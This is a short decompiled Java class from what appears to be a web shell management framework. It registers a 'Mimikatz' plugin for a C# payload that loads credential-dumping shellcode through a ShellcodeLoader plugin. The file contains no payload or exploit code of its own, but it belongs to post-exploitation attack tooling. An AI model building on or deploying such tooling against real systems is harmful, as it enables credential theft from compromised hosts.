/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(payloadName="CShapDynamicPayload", Name="Mimikatz", DisplayName="Mimikatz")
public class Mimikatz
extends shells.plugins.generic.Mimikatz {
    @Override
    protected ShellcodeLoader getShellcodeLoader() {
        return (ShellcodeLoader)this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
    }
}
